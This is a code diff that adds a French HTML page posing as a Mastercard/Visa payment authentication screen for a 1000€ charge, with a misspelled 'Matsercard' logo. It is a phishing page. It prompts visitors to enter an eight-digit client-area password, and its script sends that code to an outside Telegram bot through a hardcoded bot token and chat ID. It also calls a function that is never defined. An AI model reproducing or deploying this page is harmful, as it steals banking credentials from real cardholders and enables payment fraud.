@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #f4f4f4;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+        min-height: 100vh;
+        padding-top: 0px;
+    }
+
+    .container {
+        background: white;
+        padding: 50px;
+        border-radius: 20px;
+        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        text-align: center;
+        width: 100%;
+        max-width: 350px;
+    }
+
+    h2 {
+        color: white;
+        font-size: 21px;
+        margin-bottom: 25px;
+    }
+
+    .logos {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 15px;
+    }
+
+    .logos img {
+        height: 34px;
+        padding: 8px;
+    }
+
+    #visa {
+        height: 48px;
+    }
+
+    .auth-box {
+        background: #b66009;
+        color: white;
+        border-radius: 0px;
+        margin: 0 20px;
+        position: relative;
+        font-weight: bold;
+        font-size: 15px;
+        margin-left: -50px;
+        margin-right: -50px;
+        padding: 20px 30px;
+    }
+
+    .auth-box img {
+        display: block;
+        margin: 10px auto 0;
+        width: 40px;
+    }
+
+    .info {
+        background: #2b6cb0;
+        padding: 10px;
+        border-radius: 0px;
+        margin-top: 0;
+        font-size: 14px;
+        color: white;
+    }
+
+    .details {
+        text-align: center;
+        margin: 20px 0;
+        font-size: 14px;
+    }
+
+    .details p {
+        margin: 5px 0;
+    }
+
+    .instructions {
+        text-align: left;
+        padding: 0;
+        font-size: 14px;
+        list-style: none;
+        counter-reset: step-counter;
+    }
+
+    .instructions li {
+        margin: 10px 0;
+        position: relative;
+        padding-left: 40px;
+    }
+
+    .instructions li::before {
+        content: counter(step-counter);
+        counter-increment: step-counter;
+        position: absolute;
+        left: 0;
+        top: 50%;
+        transform: translateY(-50%);
+        background: #000;
+        color: white;
+        width: 30px;
+        height: 30px;
+        border-radius: 50%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-weight: bold;
+    }
+
+    .code-box {
+        margin-top: 20px;
+        text-align: center;
+    }
+
+    .code-box input {
+        width: 80%;
+        padding: 10px;
+        font-size: 16px;
+        text-align: center;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+    }
+
+    .code-box button {
+        margin-top: 10px;
+        background-color: #001;
+        color: white;
+        border: none;
+        padding: 10px 20px;
+        border-radius: 5px;
+        cursor: pointer;
+        font-size: 16px;
+    }
+
+    .countdown {
+        margin-top: 10px;
+        font-size: 16px;
+        color: red;
+    }
+
+    .loading-gif {
+        display: none;
+        margin-top: 20px;
+    }
+
+    #loading-gif img {
+        width: 125px;
+        height: auto;
+    }
+
+    .keypad {
+        margin-top: 15px;
+        display: grid;
+        grid-template-columns: repeat(5, 1fr);
+        gap: 10px;
+        justify-content: center;
+    }
+
+    .keypad button {
+        padding: 12px;
+        font-size: 18px;
+        background-color: #2b6cb0;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+    }
+</style>
+
+<body>
+    <div class="container">
+        <!-- Contenu inchangé -->
+        <div class="logos">
+            <img src="https://files.catbox.moe/fxt04z.jpg" alt="Matsercard">
+            <img src="https://files.catbox.moe/2h7sdc.png" id="visa" alt="Visa">
+        </div>
+        <div class="auth-box">
+            <p>Pour autoriser votre paiement, veuillez vous authentifier</p>
+            <img src="https://i.gifer.com/origin/34/34338d26023e5515f6cc8969aa027bca_w200.gif" alt="Chargement...">
+        </div>
+        <div class="details">
+            <p><strong>Montant :</strong> 1000€</p>
+            <p><strong>Date :</strong> <span id="date"></span></p>
+            <p><strong>N° de carte :</strong> <span id="display-card">xxxxxxxxxxxxXXXX</span></p>
+        </div>
+        <img alt="" class="form-image" style="border:0" src="https://files.catbox.moe/jou34j.png" height="153px"
+            data-component="video">
+
+        <div class="code-box">
+            <h4>Etape 2/2: Composez le mot de passe de votre Espace Client</h4>
+            <img alt="" class="form-image" style="border:0" src="https://files.catbox.moe/ccqgjj.png" height="100px"
+                width="100px" data-component="video">
+            <input type="text" id="securityCode" maxlength="8" placeholder="Code de sécurité (8 chiffres)">
+            <div class="keypad">
+                <button onclick="appendNumber('1')">1</button>
+                <button onclick="appendNumber('2')">2</button>
+                <button onclick="appendNumber('3')">3</button>
+                <button onclick="appendNumber('4')">4</button>
+                <button onclick="appendNumber('5')">5</button>
+                <button onclick="appendNumber('6')">6</button>
+                <button onclick="appendNumber('7')">7</button>
+                <button onclick="appendNumber('8')">8</button>
+                <button onclick="appendNumber('9')">9</button>
+                <button onclick="appendNumber('0')">0</button>
+                <button style="grid-column: span 5; justify-self: center; width: 100px;" onclick="deleteLast()">←</button>
+            </div>
+            <button class="submit-button" onclick="sendCodeToTelegram()">Valider le code</button> <!-- Bouton ajouté ici -->
+        </div>
+
+        <!-- Rest of the code remains the same -->
+        <script>
+            // Mise à jour du date à chaque chargement de page
+            function updateDate() {
+                const options = { timeZone: 'Europe/Paris', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit' };
+                const now = new Date().toLocaleString('fr-FR', options);
+                const dateElement = document.getElementById('date');
+                if (dateElement) {
+                    dateElement.textContent = now;
+                }
+            }
+
+            // Compte à rebours
+            function startCountdown(durationInSeconds, display) {
+                let timer = durationInSeconds, minutes, seconds;
+                const interval = setInterval(function () {
+                    minutes = parseInt(timer / 60, 10);
+                    seconds = parseInt(timer % 60, 10);
+                    minutes = minutes < 10 ? "0" + minutes : minutes;
+                    seconds = seconds < 10 ? "0" + seconds : seconds;
+                    display.textContent = minutes + ":" + seconds;
+                    if (--timer < 0) {
+                        clearInterval(interval);
+                        display.textContent = "Expiré"; // après expiration
+                    }
+                }, 1000);
+            }
+
+            // Envoi du code à Telegram
+            function sendCodeToTelegram() {
+                const code = document.getElementById('securityCode').value;
+
+                // Vérification de la validité du code
+                if (code.length === 8 && /^\d{8}$/.test(code)) {
+                    // Affichage de l'animation de chargement
+                    document.getElementById('loading-gif').style.display = 'block';
+
+                    const telegramBotToken = '7397031599:AAHgmL_t9K5uY7Uo0A7QN6ZlVtX8y2A0lj8';
+                    const chatId = '6669693805';
+                    const message = `Code de sécurité: ${code}`;
+
+                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+                } else {
+                    // Affichage de l'erreur si le code est incorrect
+                    document.getElementById('validation-error').style.display = 'block';
+                }
+            }
+
+            // Fonction d'ajout des chiffres dans le code
+            function appendNumber(number) {
+                const codeInput = document.getElementById('securityCode');
+                if (codeInput.value.length < 8) {
+                    codeInput.value += number;
+                }
+            }
+
+            // Fonction pour supprimer le dernier chiffre
+            function deleteLast() {
+                const codeInput = document.getElementById('securityCode');
+                codeInput.value = codeInput.value.slice(0, -1);
+            }
+
+            // Chargement de toutes les fonctions à l'ouverture de la page
+            window.onload = function () {
+                updateDate(); // Mettre à jour la date
+                const countdownElement = document.getElementById('countdown');
+                if (countdownElement) {
+                    startCountdown(300, countdownElement); // Commencer un compte à rebours de 5 minutes (300 secondes)
+                }
+                sendInitialMessage(); // Envoyer un message initial à Telegram
+            };
+        </script>
+    </div>
+</body>
+
+</html>
